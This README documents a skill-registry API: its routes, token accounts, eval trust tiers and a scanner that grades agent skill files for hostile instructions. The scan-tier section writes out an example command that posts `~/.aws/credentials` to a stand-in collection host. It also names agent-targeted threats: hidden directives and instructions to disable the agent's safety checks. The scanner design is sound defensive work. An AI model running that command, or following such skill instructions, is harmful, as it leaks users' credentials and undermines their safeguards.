# api.skillrank.dev

The hosted registry. It serves the `/v3/rest/skill-registry` contract as a single
Vercel function (`api/registry.mjs`), split into two halves:

- **Reads** — search / show / resolve / eval-suites, served from the ingested
  public-skill catalog (`api/enriched.json`, `api/ingested.json`). Fully
  anonymous, edge-cacheable, and identical whether or not a token is presented.
- **Writes** — accounts, tokens, and eval-result ingest, backed by Upstash Redis
  (`lib/auth.mjs`, `lib/ingest.mjs`, `lib/store.mjs`). Account-gated, never
  cached, and they fail loudly (`503`) when the datastore is missing rather than
  reporting a success that was never persisted.

Content hashes were computed by the ingestion pipeline exactly like the Rust
client (`skillrank-core::hash::compute_content_hash`), so `install`
hash-verification passes.

Helper modules live in `lib/`, not `api/`: Vercel turns every source file under
`api/` into its own public endpoint. Vercel's file tracer follows the static
imports from `api/registry.mjs`, so `lib/` still ships with the function.

## Routes

Every path below is relative to `/v3/rest/skill-registry`.

| Method | Path | Auth | Notes |
| --- | --- | --- | --- |
| `GET` | `/skills` | none | search |
| `GET` | `/skills/facets` | none | the filter vocabulary the catalog actually has |
| `GET` | `/skills/<slug>` | none | detail |
| `GET` | `/skills/<slug>/resolve` | none | install coordinates |
| `GET` | `/skills/<slug>/eval-results` | none | published aggregate cells; counts only, never contributor identities |
| `GET` | `/eval-suites` | none | suite index (no task bodies) |
| `GET` | `/eval-suites/<id>` | none | suite definition |
| `GET` | `/eval-suites/<id>/verifiers` | none | verifier scripts |
| `GET` | `/installs` | none | install-intent counters |
| `POST` | `/subscribe` | none | email capture |
| `POST` | `/auth/device` | none | start a GitHub device authorization |
| `POST` | `/auth/tokens` | none | mint a token — `{"kind":"anonymous"}` or `{"kind":"github","device_code":"..."}` |
| `DELETE` | `/auth/tokens` | bearer | revoke the presented token |
| `GET` | `/auth/whoami` | optional bearer | `{ authenticated, kind, account_id, created_at, verified }` |
| `POST` | `/auth/accounts/<id>/revoke` | maintainer bearer | revoke an account and flag its results |
| `POST` | `/eval-results` | bearer | publish an `EvalBundle` |

`GET /skills/facets` answers `{categories, stacks, scan_tiers}`, each a list of
`{value, count}` ordered by count desc (ties alphabetical). Every `value` is a
term `/skills?category=` / `?stack=` matches, and every `count` is the `total`
that filter returns — so a client builds its filter UI from the catalog instead of
guessing option lists that match nothing. `GET /eval-suites` answers
`{items:[{id, version, task_count, reference_env, title?, description?}], total}`;
task instructions stay in `GET /eval-suites/<id>` so the index stays small.

`POST /eval-results` answers `200 {accepted:true, result_id, tier_state,
conforming}` on success, `400 {accepted:false, error, reason}` on a validation
rejection, `401` without a usable token, `413` for an oversized bundle, `429`
with a `Retry-After` header when rate limited, and `503` when the datastore is
unreachable. Rejections are non-2xx on purpose: `skillrank eval --publish` prints
"Published" for any 2xx regardless of `accepted`, so `200 {accepted:false}` would
make the CLI lie.

The GitHub device exchange answers `202 {status:"authorization_pending"|"slow_down",
interval}` while the user is still approving in the browser, and `201` with the
token once they have.

## Scan tiers

A skill is natural-language instructions an agent follows with the user's
credentials and shell. There is no sandbox, so the threat is not a malicious
binary — it is a malicious or reckless *instruction*: exfiltrate a secret, run a
destructive command, install remote code, or disable the agent's own safety
checks. `lib/scan.mjs` reads that prose (and the shell embedded in it) during
ingest and stores a `ScanTier` next to the content hash.

| tier | meaning | prompts? |
| --- | --- | --- |
| `safe` | prose-only playbook; nothing that can touch the machine | no |
| `low` | ordinary developer capability — installs, git, documented APIs | no |
| `medium` | one real concern: dual-use capability, self-declared autonomy, an unreviewable payload | yes |
| `high` | permission-system subversion, unscoped destruction, remote exec from an untrusted host | yes |
| `flagged` | credential egress, obfuscation, hidden directives | yes |
| `unknown` | no `SKILL.md` exists to scan (collection, unreachable repo) | yes |
| `pending` | pinned but not yet scanned — transient | yes |

Every rule is **two-factor**: a capability only fires when it co-occurs with an
incriminating object. `curl -X POST https://$TARGET/api/login` is a pentest skill
acting on its own engagement target; `curl -X POST https://collect.example.io -d
"$(cat ~/.aws/credentials)"` is exfiltration. Single-keyword matching trips 31% of
the real catalog, which is exactly how the registry ended up warning on
everything. The rules, their measured false-positive traps, and the reasoning
behind each threshold are documented inline in `lib/scan.mjs`.

Current distribution over the 2,002 installable entries: **94% `safe`/`low`**,
4% `medium`, <1% `high`/`flagged`. `test/scan-calibration.test.mjs` fails the
build if that drops below 90% — a scanner that prompts on most of the catalog
trains people to click through, which is the failure this replaced.

That threshold only measures over-blocking, so it is paired with the opposite
gate. `test/scan-adversarial.test.mjs` runs 25 inert probe documents that each
evade one named rule or context gate, and fails if fewer than 18 of them prompt.
Scanner v1.0.0 caught 2 of the 25; v1.1.0 catches 18. The seven still missed are
kept in the table with their technique named — an unmeasured gap becomes an
invisible one.

`GET /skills/<slug>` and `GET /skills/<slug>/resolve` additionally carry
`scan: { tier, score, scanner_version, findings: [{rule, severity, line, excerpt,
why}] }` so a confirmation dialog can name the exact line that caused the verdict
instead of saying "unverified". The object is additive and omitted when there is
nothing to report; `scan_tier` keeps its existing shape and is always one of the
seven `ScanTier` variants, so already-compiled clients keep deserializing.

### Re-tiering

Tiers are derived from content, and content is deliberately not persisted (the
registry is index-only and never rehosts). So bumping `SCANNER_VERSION` cannot
re-score anything from local state — the pinned bytes have to come back:

```
node registry/ingest/rescan.mjs          # re-fetch + re-tier stale verdicts only
node registry/ingest/rescan.mjs --all    # re-tier everything
node registry/ingest/ingest.mjs --rescan # same, as part of a full ingest pass
```

`rescan.mjs` needs no GitHub token — it reads the already-pinned
`raw_content_url` — and refuses to re-tier when the content no longer hashes to
what we publish, so a stored verdict always describes the bytes we actually
serve. Both catalog workflows run it and then run the calibration test before
committing.

## Accounts

Two token classes, and the difference is the point:

- **anonymous** — self-service, no identity. ZeroShot provisions one on install so
  nobody copy-pastes a token. These publish, and their results are Self-reported
  forever; they never count toward Community corroboration, because minting one is
  free and "N independent accounts" would otherwise collapse to "N installs".
- **github** — bound to a GitHub user id via the OAuth device flow, and only these
  corroborate. Signing in again always lands on the same `account_id`.

Tokens are 32 random bytes (`srk_` + base64url), returned in plaintext exactly
once, and stored only as a SHA-256 hash. Verification compares the recomputed
digest against the stored one in constant time. Nothing here logs a token, and IP
addresses are only ever used as a **secret**-salted digest inside a short-lived
rate-limit counter (see `RATE_LIMIT_IP_SALT` below — a publicly known salt would
make that digest reversible).

The maintainer credential (`REGISTRY_ADMIN_TOKEN`) is compared raw and in constant
time, deliberately *not* filtered through the charset of the tokens we mint: a
password-manager secret like `Xk9#mQ2$vL8@nP4!` would otherwise be reduced to `""`
and produce a permanent `401` indistinguishable from a wrong secret, during the one
incident where revocation is the lever.

## Trust tiers

`tier_state` is computed per **cell** — the `(skill, content_hash, suite,
environment cell)` tuple that makes results comparable.

- **Self-reported** — the default for everything.
- **Community-reported** — requires a *conforming* cell, corroboration from
  `COMMUNITY_MIN_ACCOUNTS` distinct verified accounts, and their per-account mean
  pass-rate deltas agreeing within `COMMUNITY_VARIANCE_BAND`.
- **Official** — maintainer-run only; this endpoint cannot produce it.

The badge and the numbers printed beside it describe the **same population**. A
corroborated cell reports the verified accounts' rates and says so in
`metrics_basis: "verified_accounts"`; anonymous contributions are reported beside
them as their own counts (`n_anonymous_accounts`, `n_anonymous_results`) rather
than folded into the headline. Without that split, one free auto-provisioned token
could rewrite evidence it was explicitly excluded from earning. A self-reported
cell has no split — "self-reported" already means "whoever reported it" — so its
`metrics_basis` is `all_accounts`.

Corroboration is also per **harness version**: `harness.version` is part of the
cell id, because the runner bakes it into `config_hash` for the same reason. A
runner release starts fresh cells rather than inheriting numbers it cannot be
compared against.

### What `conforming` does and does not prove

`conforming` is **self-attested**. The registry recomputes it from the bundle's
own `environment_cell` rather than reading a `conforming` flag off the wire, and
recomputes `config_hash` over those same fields — so a bundle cannot disagree with
itself, and a *tampered* `config_hash` is rejected. But that proves
self-consistency, not provenance: a publisher who runs in a worktree, relabels the
cell as `docker`, and recomputes `config_hash` to match produces an accepted,
`conforming: true` result. So does simply reporting `pass` for every treatment
trial. Read `conforming` as *"claims a conforming environment"*.

That is a deliberate boundary, not an oversight: the trial verdicts are equally
unattested, and R5 puts the anti-gaming burden on the cost of verified accounts and
on independent corroboration, not on trusting one publisher. Making it verifiable
needs a signed harness attestation over the *observed* cell, which `EvalBundle` has
no field for — adding one is a wire-contract change for every installed CLI, and
therefore future work.

Because no shipped client currently emits `isolation: "docker"`, every bundle in
the wild publishes as Self-reported today. That is the documented rule, not a gap.

## Environment

Writes need Upstash. Everything else has a working default.

| Variable | Default | Purpose |
| --- | --- | --- |
| `KV_REST_API_URL` / `KV_REST_API_TOKEN` | — | Upstash REST endpoint (`UPSTASH_REDIS_REST_URL` / `_TOKEN` also accepted). Without these, reads work and every write returns `503`. |
| `GITHUB_CLIENT_ID` | — | Enables GitHub sign-in. Unset ⇒ `/auth/device` and `kind:"github"` return `503`. |
| `GITHUB_CLIENT_SECRET` | — | Sent on the device-code exchange only when set (the device flow does not require it). |
| `GITHUB_MIN_ACCOUNT_AGE_DAYS` | `30` | Minimum GitHub account age for verified standing. |
| `REGISTRY_ADMIN_TOKEN` | — | Maintainer credential for account revocation; at least 16 characters. Unset ⇒ `503`. |
| `COMMUNITY_MIN_ACCOUNTS` | `3` | Verified accounts needed for Community-reported. Floored at 2 — at 1 the tier would mean nothing. |
| `COMMUNITY_VARIANCE_BAND` | `0.25` | Max spread of per-account pass-rate deltas. |
| `EVAL_MAX_AGE_DAYS` | `30` | Oldest `created_at` accepted (ZeroShot republishes saved bundles). |
| `EVAL_MAX_FUTURE_SKEW_HOURS` | `24` | Clock-skew tolerance. |
| `EVAL_MAX_BODY_BYTES` | `262144` | Bundle size cap; over it ⇒ `413`. |
| `EVAL_MAX_TRIALS_PER_ARM` | `25` | Trial cap per arm. |
| `EVAL_MAX_RESULTS_PER_CELL` | `500` | Per-result summaries retained per cell. At the ceiling a new submission is still stored and the largest holder is *evicted* — never silently dropped behind `accepted: true`. |
| `EVAL_MAX_RESULTS_PER_ACCOUNT_PER_CELL` | `10` | One account's share of a cell. `created_at` is client-chosen and is the idempotency tuple's only free variable, so this — not the tuple — is what bounds re-registering one physical run. Clamped to `EVAL_MAX_RESULTS_PER_CELL`. |
| `EVAL_MAX_CELLS_PER_SKILL` | `100` | Ceiling on distinct environment cells per skill. Cell identity derives from client-chosen text, and `/skills/<slug>/eval-results` returns every cell in one response. |
| `EVAL_NEW_CELLS_PER_ACCOUNT_PER_DAY` | `5` | New-cell budget per account per skill, so the ceiling above cannot be used as a lockout lever. |
| `EVAL_RETENTION_DAYS` | `400` | Lifetime armed on every `eval:*` key and re-armed on each touch, so abandoned cells age out. Far longer than `EVAL_MAX_AGE_DAYS`, so it never rejects a publishable bundle. |
| `AUTH_ANON_TOKENS_PER_IP_PER_DAY` | `20` | Anonymous minting budget. |
| `AUTH_DEVICE_STARTS_PER_IP_PER_HOUR` | `20` | GitHub device-authorization starts per IP. |
| `AUTH_GITHUB_POLLS_PER_IP_PER_HOUR` | `240` | Device-exchange polls per IP (the flow polls every ~5s for up to 15 minutes). |
| `AUTH_WHOAMI_PER_IP_PER_HOUR` | `120` | Token-introspection budget per IP. |
| `EVAL_WRITES_PER_ACCOUNT_PER_HOUR` | `30` | Publish budget per account. |
| `EVAL_WRITES_PER_ACCOUNT_PER_DAY` | `200` | Publish budget per account. |
| `EVAL_WRITES_PER_IP_PER_HOUR` | `60` | Publish budget per IP. |
| `RATE_LIMIT_IP_SALT` | derived from the Upstash token | Salt for the hashed rate-limit buckets. **There is no hardcoded default**: the digest *is* the persisted `rl:` key name, and SHA-256 under a publicly known salt is a 2^32 preimage search for IPv4 — i.e. anyone who can read the keyspace recovers every recent caller's address. Unset, it is derived from the Upstash credential (already a deployment secret, already required for any deployment that persists these keys). Set it explicitly to pin and rotate. With no datastore at all it falls back to a per-process random value, and in that case every write route answers `503` before a limiter runs, so nothing is persisted. |

## Storage layout

```
auth:token:<sha256(token)>          { account_id, kind, created_at, revoked_at }
auth:account:<account_id>           { kind, provider, subject_hash, created_at, revoked_at }
auth:subject:github:<sha256(...)>   { account_id }            # re-login reuses the account
auth:account:<account_id>:cells     SET of cell ids           # revocation fan-out
eval:result:<result_id>             the result + the VALIDATED bundle projection
eval:cell:<cell_id>                 the rolled-up cell (tier, rates, counts)
eval:cell:<cell_id>:summaries       HASH result_id -> per-result totals
eval:skill:<slug>:cells             SET of cell ids
eval:skill:<slug>:hashes            SET of content hashes results exist for
rl:<bucket>                         fixed-window counter, always TTL'd
```

Every `eval:*` key carries `EVAL_RETENTION_DAYS` and is re-armed on each touch —
including when revocation rewrites a cell, since a bare Redis `SET` discards the
key's expiry. What is stored under `eval:result:*` is the *projection* of the
bundle onto the fields the contract defines, never the client's own object:
validation checks named fields but rejects no unknown ones, so persisting the
request body would pin arbitrary attacker-chosen padding (up to the whole body
limit) forever.

`result_id` is a pure function of the spec's idempotency tuple
`(account, content_hash, suite_id, suite_version, config_hash, created_at)`, and
every aggregate is a set or hash keyed by it — so a replay rewrites the same
fields instead of appending, and a partially failed write is safe to retry.

## Deploy

```sh
vercel deploy --prod       # then attach the domain:
vercel domains add api.skillrank.dev
```

## Test

```sh
npm ci
npm test        # node --test test/ — zero dependencies beyond the runtime
```

`lib/` has no third-party imports, so the validation, tiering, and token tests run
without `node_modules`. `test/scan-api.test.mjs`, `test/discovery.test.mjs` and
`test/route.test.mjs` boot the real function behind `node:http` to cover routing,
headers, payload shape, and body limits. `test/scan.test.mjs` and
`test/scan-adversarial.test.mjs` bound the scanner from both sides — the first
fails when a legitimate skill starts prompting, the second when a hostile one
stops.

```sh
BASE=https://<deployment>.vercel.app
curl -s "$BASE/v3/rest/skill-registry/skills?q=react" | jq .
SKILLRANK_API_URL=$BASE skillrank search react
```
